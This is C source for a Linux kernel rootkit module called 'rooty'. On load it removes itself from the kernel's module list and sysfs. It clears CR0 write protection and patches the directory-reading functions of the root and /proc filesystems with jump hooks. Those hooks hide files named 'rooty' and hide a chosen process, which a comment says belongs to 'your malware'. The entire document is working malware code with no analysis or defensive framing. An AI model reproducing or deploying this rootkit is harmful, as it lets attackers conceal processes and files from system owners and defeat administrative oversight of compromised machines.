#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");

int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);
static int (*o_proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*o_root_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);

#if defined(__i386__)
#define csize 6 /* code size */
#define jacked_code "\x68\x00\x00\x00\x00\xc3" /* push address, addr, ret */
#define poff 1 /* pointer offset to write address to */
#else
#define csize 12 /* code size */
/* mov address to register rax, jmp rax. for normal x64 convention */
#define jacked_code "\x48\x8b\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define poff 2
#endif

struct hook {
  void *target; /* target pointer */
  unsigned char hijack_code[csize]; /* hijacked function jmp */
  unsigned char o_code[csize]; /* original function asm */
  struct list_head list; /* linked list for proc and root readdir/iterator */
};

LIST_HEAD(hooked_targets);

void jack_it(void *target) {
  /* o.0 dirty minds? */
  struct hook *h;

  list_for_each_entry(h, &hooked_targets, list) {
    if (target == h->target) {
      preempt_disable();
      barrier();
      write_cr0(read_cr0() & (~ 0x10000));
      memcpy(target,h->hijack_code,csize);
      write_cr0(read_cr0() | 0x10000);
      barrier();
      preempt_enable_no_resched();
    }
  }
}

void fix_it(void *target) {
  struct hook *h;

  list_for_each_entry(h, &hooked_targets, list) {
    if (target == h->target) {
      preempt_disable();
      barrier();
      write_cr0(read_cr0() & (~ 0x10000));
      memcpy(target,h->o_code,csize);
      write_cr0(read_cr0() | 0x10000);
      barrier();
      preempt_enable_no_resched();
    }
  }
}

void *get_readdir(const char *path) {
  void *ret;
  struct file *file;

  if ((file = filp_open(path, O_RDONLY, 0)) == NULL)
    return NULL;

  ret = file->f_op->readdir;
  filp_close(file,0);

  return ret;
}

static int rooty_root_filldir(void *__buff, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
  char *get_protect = "rooty";

  if (strstr(name,get_protect))
    return 0;

  return o_root_filldir(__buff,name,namelen,offset,ino,d_type);
}

int rooty_root_readdir(struct file *file, void *dirent, filldir_t filldir) {
  int ret;
  o_root_filldir = filldir;

  fix_it(o_root_readdir);
  ret = o_root_readdir(file,dirent,&rooty_root_filldir);
  jack_it(o_root_readdir);

  return ret;
}

static int rooty_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
  long pid;
  char *endp;
  /* my_pid is where your malware would communicate to the rootkit what the pid is to hide */
  long my_pid = 1;
  unsigned short base = 10;

  pid = simple_strtol(name,&endp,base);
  if (pid == my_pid)
    return 0;

  return o_proc_filldir(__buf,name,namelen,offset,ino,d_type);
}

int rooty_proc_readdir(struct file *file, void *dirent, filldir_t filldir) {
  int ret;
  o_proc_filldir = filldir;

  fix_it(o_proc_readdir);
  ret = o_proc_readdir(file,dirent,&rooty_proc_filldir);
  jack_it(o_proc_readdir);

  return ret;
}

void save_it(void *target, void *new) {
  struct hook *h;
  unsigned char hijack_code[csize];
  unsigned char o_code[csize];

  memcpy(hijack_code,jacked_code,csize);
  *(unsigned long *)&hijack_code[poff] = (unsigned long)new;
  memcpy(o_code,target,csize);

  h = kmalloc(sizeof(*h), GFP_KERNEL);
  h->target = target;
  memcpy(h->hijack_code,hijack_code,csize);
  memcpy(h->o_code,o_code,csize);
  list_add(&h->list,&hooked_targets);
}

int rooty_init(void) {
  /* Do kernel module hiding*/
  list_del_init(&__this_module.list);
  kobject_del(&THIS_MODULE->mkobj.kobj);

  /* hijack root filesystem */ 
  o_root_readdir = get_readdir("/");
  save_it(o_root_readdir,rooty_root_readdir);
  jack_it(o_root_readdir);

  /* hijack proc filesystem */
  o_proc_readdir = get_readdir("/proc");
  save_it(o_proc_readdir,rooty_proc_readdir);
  jack_it(o_proc_readdir);

  return 0;
}

void rooty_exit(void) {
  fix_it(o_root_readdir);
  fix_it(o_proc_readdir);
  printk("rooty: Module unloaded\n");
}
